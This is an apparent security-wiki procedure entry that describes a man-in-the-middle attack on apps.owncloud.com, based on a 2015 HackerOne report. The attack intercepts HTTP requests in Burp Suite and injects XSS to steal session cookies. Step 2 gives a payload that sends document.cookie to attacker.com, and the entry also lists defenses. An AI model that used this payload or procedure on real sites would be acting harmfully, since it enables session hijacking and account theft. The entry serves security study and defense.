---
tags:
  - xss
  - http-interception
  - mitm
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Execution]]'
  - '[[Credential Access]]'
commands: []
platforms:
  - Web
techniques:
  - '[[JavaScript]]'
  - '[[Steal Web Session Cookie]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 4ced22eb-56ca-4b7a-a2ce-18dbe0104def
created_at: '2025-12-14T03:15:41.589Z'
updated_at: '2025-12-14T03:15:41.589Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Credential Access]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[Steal Web Session Cookie]]'
---
# Intercept-and-Inject-XSS-Payload-in-HTTP-Requests

## Summary

This procedure demonstrates how to exploit unencrypted HTTP traffic to apps.owncloud.com by intercepting requests, injecting a malicious XSS payload, and executing JavaScript to exfiltrate session cookies, leading to session hijacking. It targets sites lacking HTTPS and input validation, allowing attackers with MITM capabilities to modify traffic in transit.

## Description

In this attack scenario, the target is apps.owncloud.com, which handles HTTP requests without encryption. An attacker positions themselves to intercept traffic (e.g., on a shared Wi-Fi or via proxy configuration). Upon capturing a request, the attacker modifies it by injecting an XSS script into unsanitized parameters, such as search fields or headers. When the victim receives the response, the browser executes the script, capturing and sending cookies to an attacker-controlled endpoint. This was reported in HackerOne report #85577 on August 29, 2015, highlighting the risks of non-HTTPS web apps. Prerequisites include network interception capability and basic knowledge of web requests; outcomes include unauthorized access to victim accounts.

## Requirements

1. Man-in-the-Middle network position (e.g., ARP spoofing or victim-configured proxy)
2. Interception tool like Burp Suite installed and running
3. Attacker-controlled server to receive exfiltrated data (e.g., for cookie callback)
4. Victim accessing apps.owncloud.com via the intercepted connection

## Defense

Defensive measures and detection strategies:

- Enforce HTTPS with HSTS to prevent interception and modification
- Implement Content Security Policy (CSP) to block inline scripts and unauthorized domains
- Sanitize all user inputs and validate request integrity
- Monitor for anomalous traffic patterns, such as unexpected script injections or cookie exfiltration to external domains
- Use network intrusion detection systems (NIDS) to flag MITM attempts

## Objectives

1. Intercept and modify HTTP requests to inject XSS payloads
2. Execute malicious JavaScript in the victim's browser context
3. Steal session cookies and enable session hijacking

## Instructions

### Step 1: Set Up Interception

**Context**: Establish a position to capture and modify HTTP traffic to the target site.

Configure [[tools/Burp-Suite]] as a proxy. In Burp, go to Proxy > Options and set it to listen on port 8080. Ensure the victim's browser or network routes traffic through this proxy (e.g., via system proxy settings or network-level redirection).

> Once set up, all HTTP requests to apps.owncloud.com will be intercepted in Burp's Proxy > Intercept tab.

### Step 2: Capture and Modify Request

**Context**: Identify an incoming request from the victim and inject the XSS payload.

In Burp's Intercept tab, wait for a GET or POST request to apps.owncloud.com. When intercepted, modify a vulnerable parameter (e.g., append to a query string like ?q=<script>fetch('http://attacker.com?cookie='+document.cookie)</script>). Click "Forward" to send the altered request to the server.

> The server responds without sanitizing the input, embedding the script in the page sent back to the victim.

### Step 3: Execute and Exfiltrate

**Context**: Trigger payload execution and capture the stolen data.

The victim's browser renders the response, executing the injected script. Monitor your attacker server logs for incoming requests containing the session cookies.

> Successful execution results in a callback with cookie data, confirming the theft.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]
- [[Credential Access]]

### Techniques

- [[JavaScript]]
- [[Steal Web Session Cookie]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/Burp-Suite]]

## Tags

- [[xss]]
- [[http-interception]]
- [[mitm]]
- [[session-hijacking]]
